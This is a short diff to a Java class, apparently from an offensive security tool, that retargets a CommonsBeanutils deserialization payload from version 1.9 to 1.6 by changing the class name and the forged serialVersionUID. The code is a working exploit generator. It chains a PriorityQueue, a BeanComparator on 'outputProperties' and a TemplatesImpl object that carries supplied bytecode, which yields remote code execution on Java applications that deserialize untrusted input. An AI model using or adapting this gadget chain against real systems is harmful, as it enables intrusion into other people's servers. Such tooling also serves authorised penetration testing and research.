@@ -20,14 +20,14 @@ import java.util.PriorityQueue;
  * @author ReaJason
  * @since 2024/12/3
  */
-public class CommonsBeanutils19 implements Payload {
+public class CommonsBeanutils16 implements Payload {
     @Override
     @SneakyThrows
     public Object generate(byte[] bytes) {
         Object comparator = new ByteBuddy()
                 .redefine(BeanComparator.class)
                 .defineField("serialVersionUID", long.class, Visibility.PRIVATE, Ownership.STATIC, FieldManifestation.FINAL)
-                .value(-2044202215314119608L).make()
+                .value(2573799559215537819L).make()
                 .load(new URLClassLoader(new URL[]{}), ClassLoadingStrategy.Default.INJECTION).getLoaded()
                 .getDeclaredConstructor(String.class, Comparator.class)
                 .newInstance(null, String.CASE_INSENSITIVE_ORDER);
@@ -35,6 +35,7 @@ public class CommonsBeanutils19 implements Payload {
         queue.add("1");
         queue.add("1");
         Reflections.setFieldValue(comparator, "property", "outputProperties");
+
         Object obj = TemplateUtils.createTemplatesImpl(bytes);
         Reflections.setFieldValue(queue, "queue", new Object[]{obj, obj});
         return queue;
